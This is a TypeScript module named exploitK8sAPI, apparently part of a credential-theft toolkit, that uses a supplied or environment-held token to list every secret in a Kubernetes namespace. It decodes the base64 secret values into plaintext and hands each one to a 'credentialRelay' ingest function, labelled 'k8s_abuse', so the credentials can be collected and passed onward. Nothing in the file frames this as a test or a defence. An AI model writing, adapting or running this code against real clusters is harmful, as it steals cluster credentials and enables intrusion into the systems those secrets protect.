import { relayIngest } from "../credentialRelay";

export interface K8sSecretFinding {
  name: string;
  namespace?: string;
  dataLength: number;
}

export async function exploitK8sAPI(kubeconfig: any): Promise<K8sSecretFinding[]> {
  const findings: K8sSecretFinding[] = [];
  const api = kubeconfig?.apiServer || process.env.K8S_API_SERVER;
  const token = kubeconfig?.token || process.env.K8S_TOKEN;
  const namespace = kubeconfig?.namespace || "default";
  if (!api || !token) return findings;

  const url = `${api.replace(/\/$/, "")}/api/v1/namespaces/${namespace}/secrets`;
  try {
    const resp = await fetch(url, {
      headers: {
        Authorization: `Bearer ${token}`,
        Accept: "application/json",
      },
    });
    if (resp.status !== 200) return findings;
    const json: any = await resp.json();
    for (const item of json.items || []) {
      if (item.data) {
        const combined = Object.entries(item.data)
          .map(([k, v]) => `${k}=${Buffer.from(v as string, "base64").toString()}`)
          .join("\n");
        relayIngest([{
          key: `k8s_secret_${item.metadata?.name}`,
          value: combined,
          type: "K8S_SECRET",
          source: "k8s_abuse",
          target: api,
          capturedAt: new Date().toISOString(),
        }]);
        findings.push({
          name: item.metadata?.name || "unknown",
          namespace: item.metadata?.namespace,
          dataLength: combined.length,
        });
      }
    }
  } catch {
    return findings;
  }
  return findings;
}
